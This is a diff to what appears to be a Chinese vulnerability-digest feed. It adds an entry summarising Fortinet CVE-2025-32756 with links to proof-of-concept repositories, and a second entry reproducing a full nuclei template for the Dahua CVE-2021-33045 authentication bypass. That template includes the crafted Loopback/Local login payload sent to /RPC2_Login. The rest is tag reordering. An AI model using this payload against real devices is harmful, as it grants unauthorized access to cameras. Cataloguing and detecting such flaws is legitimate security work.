@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>Fortinet 栈基缓冲区溢出漏洞</title>
+    <link href="/2025/06/10/github_1587432921/"/>
+    <url>/2025/06/10/github_1587432921/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Fortinet 栈基缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-32756</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Fortinet产品中存在一个栈基缓冲区溢出漏洞，类型为AuthHash cookie的栈基缓冲区溢出，影响包括FortiVoice、FortiMail、FortiNDR、FortiRecorder和FortiCamera等产品。攻击者可以利用此漏洞进行未认证的远程代码执行。</p><p><strong>产品厂商：</strong> Fortinet</p><p><strong>产品名称：</strong> FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12292">https://github.com/projectdiscovery/nuclei-templates/issues/12292</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Is-there-an-existing-template-for-this"><a href="#Is-there-an-existing-template-for-this" class="headerlink" title="Is there an existing template for this?"></a>Is there an existing template for this?</h4><ul><li><input checked="" disabled="" type="checkbox"> I have searched the existing templates.</li></ul><h4 id="Template-requests"><a href="#Template-requests" class="headerlink" title="Template requests"></a>Template requests</h4><p>CVE-2025-32756<br>Type: Stack-based buffer overflow in AuthHash cookie<br>Impact: Unauthenticated remote code execution<br>Affected Products: FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera.</p><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p>PoC&#x2F;Exploit:<br><a href="https://github.com/kn0x0x/CVE-2025-32756-POC">https://github.com/kn0x0x/CVE-2025-32756-POC</a><br><a href="https://horizon3.ai/attack-research/attack-blogs/cve-2025-32756-low-rise-jeans-are-back-and-so-are-buffer-overflows/">https://horizon3.ai/attack-research/attack-blogs/cve-2025-32756-low-rise-jeans-are-back-and-so-are-buffer-overflows/</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>缓冲区溢出</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Dahua IPC/VTH/VTO 认证绕过漏洞</title>
+    <link href="/2025/06/10/github_3057211107/"/>
+    <url>/2025/06/10/github_3057211107/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Dahua IPC&#x2F;VTH&#x2F;VTO 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-33045</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 部分Dahua产品在登录过程中存在认证绕过漏洞。攻击者可以通过构造恶意数据包绕过设备身份认证。</p><p><strong>产品厂商：</strong> dahuasecurity</p><p><strong>产品名称：</strong> ipc-hum7xxx_firmware</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/dfcd13be04b5e4790fc20abb06b2f66f4ffea743/http%2Fcves%2F2021%2FCVE-2021-33045.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/dfcd13be04b5e4790fc20abb06b2f66f4ffea743/http%2Fcves%2F2021%2FCVE-2021-33045.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">33045</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Dahua IPC<span class="hljs-symbol">/VTH/VTO</span> <span class="hljs-operator">-</span> Authentication Bypass<br>  <span class="hljs-params">author:</span> phantomowl<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Some Dahua products contain an authentication bypass during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/dorkerdevil/CVE-2021-33045</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2021-33045</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//seclists.org/fulldisclosure/2021/Oct/13</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/NyxAzrael/Goby_POC</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/WhaleFell/CameraHack</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">33045</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">287</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.93811</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99853</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:o:dahuasecurity:ipc-hum7xxx_firmware:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> dahuasecurity<br>    <span class="hljs-params">product:</span> ipc-hum7xxx_firmware<br>  <span class="hljs-params">tags:</span> dahua,cve,cve2021,auth-bypass,seclists,kev<br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">crafted_payload:</span> |<br>    &#123;<br>      <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;global.login&quot;</span>,<br>      <span class="hljs-string">&quot;params&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;userName&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;ipAddr&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>        <span class="hljs-string">&quot;loginType&quot;</span>: <span class="hljs-string">&quot;Loopback&quot;</span>,<br>        <span class="hljs-string">&quot;clientType&quot;</span>: <span class="hljs-string">&quot;Local&quot;</span>,<br>        <span class="hljs-string">&quot;authorityType&quot;</span>: <span class="hljs-string">&quot;Default&quot;</span>,<br>        <span class="hljs-string">&quot;passwordType&quot;</span>: <span class="hljs-string">&quot;Plain&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span><br>      &#125;,<br>      <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-string">&quot;session&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;session&#125;&#125;&quot;</span><br>    &#125;<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">id:</span> extract-session<br>    <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/RPC2_Login&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br>    <span class="hljs-params">body:</span> |<br>      &#123;<br>        <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;global.login&quot;</span>,<br>        <span class="hljs-string">&quot;params&quot;</span>: &#123;<br>          <span class="hljs-string">&quot;userName&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>          <span class="hljs-string">&quot;ipAddr&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>          <span class="hljs-string">&quot;loginType&quot;</span>: <span class="hljs-string">&quot;Direct&quot;</span>,<br>          <span class="hljs-string">&quot;clientType&quot;</span>: <span class="hljs-string">&quot;NetKeyboard&quot;</span>,<br>          <span class="hljs-string">&quot;authorityType&quot;</span>: <span class="hljs-string">&quot;Default&quot;</span>,<br>          <span class="hljs-string">&quot;passwordType&quot;</span>: <span class="hljs-string">&quot;Plain&quot;</span>,<br>          <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;session&quot;</span>: <span class="hljs-number">0</span><br>      &#125;<br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;session&quot;</span><br>        <span class="hljs-params">part:</span> body<br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">name:</span> session<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;session&quot;</span>:\s<span class="hljs-operator">*</span><span class="hljs-string">&quot;([^&quot;</span>]<span class="hljs-operator">+</span>)<span class="hljs-string">&quot;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  - id: send-crafted-request</span><br><span class="hljs-string">    method: POST</span><br><span class="hljs-string">    path:</span><br><span class="hljs-string">      - &quot;</span>&#123;&#123;BaseURL&#125;&#125;<span class="hljs-operator">/</span>RPC2_Login<span class="hljs-string">&quot;</span><br><span class="hljs-string">    headers:</span><br><span class="hljs-string">      Content-Type: application/json</span><br><span class="hljs-string">    body: &quot;</span>&#123;&#123;crafted_payload&#125;&#125;<span class="hljs-string">&quot;</span><br><span class="hljs-string">    matchers-condition: and</span><br><span class="hljs-string">    matchers:</span><br><span class="hljs-string">      - type: word</span><br><span class="hljs-string">        words:</span><br><span class="hljs-string">          - &quot;</span>global.login<span class="hljs-string">&quot;</span><br><span class="hljs-string">          - &quot;</span>Local<span class="hljs-string">&quot;</span><br><span class="hljs-string">          - &quot;</span>Loopback<span class="hljs-string">&quot;</span><br><span class="hljs-string">        part: body</span><br><span class="hljs-string">      - type: status</span><br><span class="hljs-string">        status:</span><br><span class="hljs-string">          - 200</span><br><span class="hljs-string">      - type: regex</span><br><span class="hljs-string">        regex:</span><br><span class="hljs-string">          - &#x27;&quot;</span>loginType<span class="hljs-string">&quot;:<span class="hljs-char escape_">\s</span>*&quot;</span>Loopback<span class="hljs-string">&quot;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>权限绕过</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Roundcube Post-Auth RCE via PHP Object Deserialization</title>
     <link href="/2025/06/10/github_4162957930/"/>
     <url>/2025/06/10/github_4162957930/</url>
@@ -1304,9 +1358,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -1439,9 +1493,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -1682,9 +1736,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2060,9 +2114,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2330,9 +2384,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2492,9 +2546,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -2897,9 +2951,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3435,9 +3489,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3462,9 +3516,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3489,9 +3543,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3732,9 +3786,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3813,9 +3867,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4245,9 +4299,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4299,9 +4353,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4326,9 +4380,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4353,9 +4407,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4596,9 +4650,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4947,9 +5001,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -5163,9 +5217,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -5649,9 +5703,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -5676,9 +5730,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -6376,9 +6430,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7741,9 +7795,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7895,9 +7949,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7949,9 +8003,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
